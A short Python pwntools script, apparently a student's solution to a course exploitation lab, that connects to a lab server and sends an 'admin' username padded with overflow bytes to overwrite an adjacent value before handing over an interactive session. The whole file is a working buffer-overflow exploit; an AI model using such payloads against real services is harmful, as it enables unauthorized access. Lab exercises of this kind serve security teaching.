#!/usr/bin/python3
# 2022.09.29.1215.EST
from pwn import *
import time

epoch_delta = int(time.time())
print(epoch_delta)

with remote("csc748.hostbin.org", 7061) as p:
#with gdb.debug("./lab6-1.bin") as p:
    #payload = b"A"*512
    #payload = b"dfskljarefkjfrqewkljfqrwkljqrgwlkjqefrwkljrefwlkjafrglkj"

    """
    p.recv()    # Silence banner: Main Options
    p.send(b"1\n")    # Enter username
    p.recv()    # Silence username request string
    p.recv()    # Silence banner: Enter Username
    p.send(b"admin\n")
    p.recv()    # Silence banner: Main Options

    p.send(b"2\n")
    test = p.recv()
    """

    p.recv()    # Silence banner: Main Options
    p.send(b"1\n")    # Enter username
    p.recv()    # Silence banner: Enter Username
    # [TODO] Do this dynamically rather than hardcoded. This is not elegant
    overflow = b"A"*11
    p.send(b"admin" + overflow + b"BBBBBBBB" + b"\n")
    p.recv()    # Silence banner: Main Options

    p.interactive()
